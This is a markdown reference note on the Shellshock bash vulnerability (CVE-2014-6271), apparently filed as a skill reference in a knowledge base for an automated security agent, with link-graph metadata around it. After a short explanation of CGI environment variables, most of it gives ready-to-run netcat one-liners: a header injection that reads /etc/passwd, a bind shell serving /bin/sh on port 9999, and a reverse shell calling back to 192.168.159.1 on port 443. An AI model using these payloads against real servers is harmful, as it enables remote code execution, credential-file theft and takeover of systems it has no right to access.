---
title: shellshock
type: reference
source: 07_SKILLS/amos-security-safety-master/references
tags:
- reference
- amos-security-safety-master
- type/skill
- system-scan-agent
- automation-profiles
- amos-simulation-kernel-v0-math-foundations
- law-hierarchy
- trang-framework-recursive-ontology-dynamics
rscf:
  state: SOURCE_CLAIM
  claim_class: SOURCE_CLAIM
  provenance: AMOS_corpus
  scope: skill_reference
---

# Shellshock Vulnerability

> Source: `_00_Cosmo brain/misc/S/Shell_Shock.md`
> Epistemic class: SOURCE_DERIVED

---
tags: [misc]
---
# Shell Shock
General
- CVE-2014-6271
- Impacts BASH shell
- Find a CGI that uses Bash

How CGI's Work (Common Gateway Interface)
- CGI's commonly use Python or Perl
- When you call it, server starts process to run CGI
   	- Maybe that is a bash process to run CGI script
- Server passes info to CGI Script
   	- Uses envrionmental variables
   	- allows server to send headers to CGI
   	- e.g. http header “abc” is an EV called HTTP_ABC

The Vulnerability
- Source of issue: Bash can have internal function declared in it's EV's
- run arbitrary commands after a function declaration
- declare EV is a function by adding () -> add some injected commands to run

Exploit
- netcat
- read arbitrary files:
   	- echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
- Creating an empty function:
   	- () { :;};

Bind Shell
- use netcat to listen on a port and redirect input & output to /bin/sh
- echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
   	- only works if netcat is installed
- if connection hangs, the CGI is waiting for you to connect using: nc vulnerable 9999

Reverse Shell
- bind a port on our system
- find a port that the server is likely to have access to
   	- 21 (FTP), 53 (DNS), 123 (NTP), 80 (HTTP), 443 (HTTPS)
- Try 443 (as root)
   	- nc -l -p 443
- Payload
   	- echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80

---
**Related:** [[00_HOME]] · [[KNOWLEDGE_MOC]] · AMOS_SIMULATION_KERNEL_V0_MATH_FOUNDATIONS · SYSTEM_SCAN_AGENT · AUTOMATION_PROFILES

---
**MOC:** references_MOC
---

**Related:** [[00_HOME]] · [[AMOS_RSCF_NODES]] · [[LAW_HIERARCHY]] · references_MOC · [[07_SKILLS_MOC]]

**MOC:** references_MOC

**Trang Framework:** [[TRANG_FRAMEWORK_RECURSIVE_ONTOLOGY_DYNAMICS]]

---
RSCF-NODE
node_id: amos-security-safety-master-shellshock
node_type: reference
path: 07_SKILLS/amos-security-safety-master/references/shellshock.md
RSCF-RELATIONS:
- INDEXED_BY: [[00_HOME]]
- INDEXED_BY: [[AMOS_RSCF_NODES]]
- CHILD_OF: references_MOC
